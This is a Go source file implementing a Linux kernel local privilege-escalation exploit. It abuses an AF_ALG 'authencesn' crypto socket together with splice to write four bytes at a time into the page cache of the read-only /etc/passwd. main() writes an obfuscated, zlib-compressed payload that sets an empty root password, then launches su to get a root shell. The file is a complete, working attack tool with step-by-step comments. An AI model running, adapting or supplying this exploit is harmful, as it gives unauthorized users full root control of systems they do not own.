//Based on https://github.com/badsectorlabs/copyfail-go

package main

import (
    "bytes"
    "compress/zlib"
    "encoding/hex"
    "io"
    "log"
    "os"
    "os/exec"
    "strings"
    "unsafe"

    "golang.org/x/sys/unix"
)

// Crypto API socket constants
const (
    SOL_ALG               = 279
    ALG_SET_KEY           = 1
    ALG_SET_IV            = 2
    ALG_SET_OP            = 3
    ALG_SET_AEAD_ASSOCLEN = 4
    ALG_SET_AEAD_AUTHSIZE = 5
)

// Decompresses hex payload
func decompressPayload(zlibBytes []byte) []byte {
    r, err := zlib.NewReader(bytes.NewReader(zlibBytes))
    if err != nil {
        log.Fatalf("Zlib decompression failed: %v", err)
    }
    payload, err := io.ReadAll(r)
    r.Close()
    if err != nil {
        log.Fatalf("Read zlib payload: %v", err)
    }
    return payload
}

// Builds control message (cmsg) buffer to be sent with payload
func buildCmsg(level, typ int, data []byte) []byte {
    cmsgSpace := unix.CmsgSpace(len(data))
    b := make([]byte, cmsgSpace)
    h := (*unix.Cmsghdr)(unsafe.Pointer(&b[0]))
    h.Level = int32(level)
    h.Type = int32(typ)
    h.SetLen(unix.CmsgLen(len(data)))
    copy(b[unix.CmsgLen(0):], data)
    return b
}

// Triggers page cache 4-byte write primitive via algif_aead socket
func patch(f *os.File, t int, cData []byte) {

    //1) Create AF_ALG cryptographic socket
    fd, err := unix.Socket(unix.AF_ALG, unix.SOCK_SEQPACKET, 0)
    if err != nil {
        log.Fatalf("Socket creation failed: %v", err)
    }
    defer unix.Close(fd)

    //2) Bind to vulnerable authenticated encryption wrapper (authencesn)
    sa := &unix.SockaddrALG{
        Type: "aead",
        Name: "authencesn(hmac(sha256),cbc(aes))",
    }
    if err := unix.Bind(fd, sa); err != nil {
        log.Fatalf("Socket bind failed: %v", err)
    }

    //3) Setup dummy key and auth sizes
    keyHex := "0800010000000010" + strings.Repeat("0", 64)
    keyBytes, _ := hex.DecodeString(keyHex)

    if err := unix.SetsockoptString(fd, SOL_ALG, ALG_SET_KEY, string(keyBytes)); err != nil {
        log.Fatalf("Setsockopt(key) failed: %v", err)
    }
    if err := unix.SetsockoptInt(fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, 4); err != nil {
        log.Fatalf("Setsockopt(authsize) failed: %v", err)
    }

    //4) Accept new operational socket connection
    uFdRaw, _, errno := unix.Syscall6(unix.SYS_ACCEPT4, uintptr(fd), 0, 0, 0, 0, 0)
    if errno != 0 {
        log.Fatalf("Accept failed: %v", errno)
    }
    uFd := int(uFdRaw)
    defer unix.Close(uFd)

    //5) Build control messages
    var init []byte
    init = append(init, buildCmsg(SOL_ALG, ALG_SET_OP, []byte{0, 0, 0, 0})...)                        // ALG_SET_OP (Decrypt)
    init = append(init, buildCmsg(SOL_ALG, ALG_SET_IV, append([]byte{0x10}, make([]byte, 19)...))...) // ALG_SET_IV (20 bytes)
    init = append(init, buildCmsg(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, []byte{8, 0, 0, 0})...)             // ALG_SET_AEAD_ASSOCLEN

    //6) Configure encryption state, send payload prefix padding
    msgData := append([]byte("AAAA"), cData...)
    err = unix.Sendmsg(uFd, msgData, init, nil, unix.MSG_MORE)
    if err != nil {
        log.Fatalf("Sendmsg failed: %v", err)
    }

    //7) Setup pipes for splice
    var p [2]int
    if err := unix.Pipe(p[:]); err != nil {
        log.Fatalf("Pipe creation failed: %v", err)
    }
    defer unix.Close(p[0])
    defer unix.Close(p[1])

    //8) Splice (moves read-only page cache ref into the pipe, then to the crypto socket)
    o := t + 4
    offset := int64(0)

    // Splice from target file into the pipe
    _, err = unix.Splice(int(f.Fd()), &offset, p[1], nil, o, 0)
    if err != nil {
        log.Fatalf("Splice (File->Pipe) failed: %v", err)
    }

    // Splice from pipe into crypto socket
    _, err = unix.Splice(p[0], nil, uFd, nil, o, 0)
    if err != nil {
        log.Fatalf("Splice (Pipe->Socket) failed: %v", err)
    }

    //9) Consume response, triggering page cache write
    buf := make([]byte, 8+t)
    unix.Read(uFd, buf)
}

func main() {
    targetExec := "su"
    targetFile := "/etc/passwd"
    payloadHex := "789c2bcacf2fb1b232004200138f030d" //"root::0:0:"
    payloadZlib, err := hex.DecodeString(payloadHex)
    if err != nil {
        log.Fatalf("Invalid hex payload: %v", err)
    }
    payload := decompressPayload(payloadZlib)

    // Open target file in read-only mode
    f, err := os.Open(targetFile)
    if err != nil {
        log.Fatalf("Failed to open target file: %v", err)
    }
    defer f.Close()

    // Incrementally overwrite the page cache of target file, 4 bytes at a time
    log.Printf("Overwriting page cache of %s with %d bytes...", f.Name(), len(payload))
    for i := 0; i < len(payload); i += 4 {
        end := i + 4
        if end > len(payload) {
            end = len(payload)
        }
        log.Printf("Writing bytes %d/%d...", i, len(payload))
        patch(f, i, payload[i:end])
    }
    log.Printf("Wrote %d bytes.", len(payload))

    log.Printf("Executing %s...", targetExec)
    var cmd *exec.Cmd
    cmd = exec.Command(targetExec)
    cmd.Stdin = os.Stdin
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr

    if err := cmd.Run(); err != nil {
        log.Fatalf("Failed to execute: %v", err)
    }
}
